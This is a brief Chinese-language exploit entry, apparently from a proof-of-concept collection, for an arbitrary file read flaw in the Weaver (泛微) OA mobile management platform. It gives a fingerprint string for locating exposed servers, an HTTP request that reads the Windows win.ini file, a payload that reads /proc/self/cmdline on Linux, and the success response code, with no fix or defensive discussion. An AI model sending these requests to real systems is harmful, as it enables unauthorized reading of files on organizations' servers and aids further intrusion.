# 泛微-移动管理平台win任意文件读取漏洞

泛微OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="移动管理平台-企业管理"`
- **请求**：`GET /client/cdnfile/1C/Windows/win.ini?windows HTTP/1.1`

**Payload**
```
GET /client/cdnfile/C/proc/self/cmdline?linux HTTP/1.1
```
- **响应特征**：200